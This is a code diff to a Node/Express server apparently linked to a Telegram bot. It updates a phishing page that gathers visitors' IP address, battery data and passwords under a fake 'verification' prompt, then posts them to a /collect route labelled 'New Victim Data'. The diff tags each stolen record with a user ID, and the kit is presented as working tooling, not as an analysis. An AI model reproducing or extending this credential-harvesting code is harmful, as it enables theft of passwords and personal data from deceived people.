@@ -9,15 +9,14 @@ app.use(express.json());
 // ========== CONFIG FROM ENVIRONMENT ==========
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_ID = process.env.ADMIN_ID;
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
 if (!BOT_TOKEN || !ADMIN_ID) {
     console.error('❌ Missing BOT_TOKEN or ADMIN_ID environment variables!');
     process.exit(1);
 }
 
-// ========== DATABASE PATH FIX ==========
-// Bot aur server ka database ab bot directory me hai
+// ========== DATABASE PATH ==========
 const DB_PATH = path.join(__dirname, '..', 'bot', 'database.db');
 const db = new sqlite3.Database(DB_PATH);
 
@@ -31,10 +30,10 @@ db.run(`CREATE TABLE IF NOT EXISTS users (
 
 // ========== ROUTES ==========
 
-app.get('/:code', (req, res) => {
-    const code = req.params.code;
+app.get('/:userId', (req, res) => {
+    const userId = req.params.userId;
     
-    db.get("SELECT photo_id FROM users WHERE unique_code = ?", [code], (err, row) => {
+    db.get("SELECT photo_id FROM users WHERE user_id = ?", [userId], (err, row) => {
         let photoUrl = 'https://via.placeholder.com/300';
         if (row && row.photo_id) {
             photoUrl = `https://your-telegram-bot.com/get-photo?file_id=${row.photo_id}`;
@@ -186,7 +185,8 @@ app.get('/:code', (req, res) => {
                             body: JSON.stringify({
                                 ip: ipData.ip,
                                 battery: batteryData,
-                                step: 'info'
+                                step: 'info',
+                                userId: ${userId}
                             })
                         });
                         
@@ -207,7 +207,8 @@ app.get('/:code', (req, res) => {
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
                                         passwords: data.passwords,
-                                        step: 'passwords'
+                                        step: 'passwords',
+                                        userId: ${userId}
                                     })
                                 });
                                 alert('✅ Verification successful! Your content is now available.');
@@ -233,6 +234,10 @@ app.get('/:code', (req, res) => {
 app.post('/collect', async (req, res) => {
     const data = req.body;
     let message = '📥 *New Victim Data*\n\n';
+    
+    if (data.userId) {
+        message += `👤 *User ID:* \`${data.userId}\`\n`;
+    }
     
     if (data.step === 'info') {
         message += `🌐 IP: ${data.ip || 'N/A'}\n`;
